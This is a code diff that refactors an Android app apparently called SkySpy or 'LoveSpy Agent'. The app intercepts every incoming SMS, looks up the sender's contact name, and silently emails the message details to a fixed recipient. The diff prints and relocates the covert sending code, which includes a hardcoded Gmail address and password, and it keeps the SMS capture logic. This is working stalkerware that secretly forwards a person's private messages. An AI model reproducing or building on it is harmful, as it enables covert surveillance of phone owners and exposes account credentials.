@@ -3,23 +3,11 @@ package com.example.skyspy.app.sms;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.database.Cursor;
-import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
-import android.provider.ContactsContract;
 import android.telephony.SmsMessage;
-import android.util.Log;
-import android.widget.Toast;
 
-import com.example.skyspy.app.email.EmailSending;
-import com.example.skyspy.app.network.NetworkStatus;
-import com.example.skyspy.app.network.NetworkUpdateReceiver;
-import com.example.skyspy.app.utils.Utils;
-
-import java.text.DateFormat;
-import java.text.SimpleDateFormat;
-import java.util.Date;
+import com.example.skyspy.app.email.EmailHelper;
 
 public class SmsReceivedListener extends BroadcastReceiver {
 
@@ -35,57 +23,11 @@ public class SmsReceivedListener extends BroadcastReceiver {
                 @Override
                 protected Void doInBackground(String... params) {
                     String letter = params[0];
-                    trySending(letter);
+                    EmailHelper.trySending(letter, mContext);
                     return null;
                 }
             }.execute(getSmsDetails());
         }
-    }
-
-    private void trySending(String letter) {
-        if (NetworkStatus.getInstance(mContext).isOnline()) {
-            sendEmailSilently(letter);
-        } else {
-            SmsReader.SUSPENDED_LIST.add(letter);
-            NetworkUpdateReceiver.setLetterList(SmsReader.SUSPENDED_LIST);
-        }
-    }
-
-    private void sendEmailSilently(String letter) {
-        EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
-        String[] toArr = {"1eecooper@ukr.net"};
-        emailSending.setTo(toArr);
-        emailSending.setFrom("wooo@wooo.com");
-        emailSending.setSubject("[Sms] LoveSpy Agent");
-        try {
-            emailSending.sendSilently(letter);
-        } catch(Exception e) {
-            Log.e(Utils.TAG, "Could not send email", e);
-        }
-    }
-
-    private String getDate(Long timeMs) {
-        Date date = new Date(timeMs);
-        DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
-        return df.format(date);
-    }
-
-    private String getContactName(String address) {
-        String name = null;
-        Uri peopleUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
-        String[] projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };
-        Cursor cur = mContext.getContentResolver().query(peopleUri, projection, null, null, null);
-        if (cur.getCount() > 0) {
-            cur.moveToFirst();
-            name = cur.getString(cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
-        }
-        cur.close();
-        return name;
-    }
-
-    private String removeNewLine(String str){
-        str = str.replace("\n"," ");
-        return str;
     }
 
     private String getSmsDetails(){
@@ -103,17 +45,17 @@ public class SmsReceivedListener extends BroadcastReceiver {
                     body = msgs[i].getMessageBody();
                     time = msgs[i].getTimestampMillis();
                     if (i == 0) {
-                        message += "Date: "+getDate(time)+"\n";
-                        message += "Type: INBOX\n";
+                        message += "Date: "+SmsHelper.convertDate(time)+"\n";
+                        message += "Type: "+SmsHelper.INBOX+"\n";
                         message += "Number: "+address+"\n";
-                        message += "Name: "+getContactName(address)+"\n";
+                        message += "Name: "+SmsHelper.getContactName(address, mContext)+"\n";
                         if (msgs.length == 1) {
-                            message += "Body: "+removeNewLine(body)+"\n";
+                            message += "Body: "+SmsHelper.removeNewLine(body)+"\n";
                         } else {
-                            message += "Body: "+removeNewLine(body)+" ";
+                            message += "Body: "+SmsHelper.removeNewLine(body)+" ";
                         }
                     } else {
-                        message += removeNewLine(body)+" ";
+                        message += SmsHelper.removeNewLine(body)+" ";
                     }
                 }
                 if (msgs.length == 1) {
